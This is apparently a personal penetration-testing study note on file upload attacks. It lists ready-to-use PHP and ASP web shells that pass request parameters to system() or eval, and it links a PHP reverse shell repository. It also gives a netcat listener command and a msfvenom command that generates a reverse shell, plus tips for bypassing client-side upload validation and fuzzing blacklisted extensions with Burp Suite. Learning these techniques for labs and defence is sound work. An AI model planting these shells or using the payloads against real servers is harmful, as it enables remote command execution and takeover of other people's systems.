PHP Web Shell File : `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; } ?>`

Custom Web Shell : `<?php system($_REQUEST['cmd']); ?>`

ASP Web Shell : `<% eval request('cmd') %>`

PHP Reverse Shell Repository : https://github.com/pentestmonkey/php-reverse-shell

> While running the above reverse shell, we need to start the Netcat Listener : `nc -lvnp OUR_PORT`

Generating Custom Reverse Shell : `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

## Client Side Validation
Use Burp Suite, on the front end, add a PNG File and then intercept this request and try to change the filename and add the payload in the body.

![[Pasted image 20250416175605.png]]

We can also remove the checkFile function present in the HTML, that would remove the Client Side Validation.

## Blacklisting Filters
**Fuzzing Extensions :**  To know what all files extensions are allowed we can simply use the BurpSuite and put a wordlist for it provided by Seclist.
![[Pasted image 20250416180959.png]]
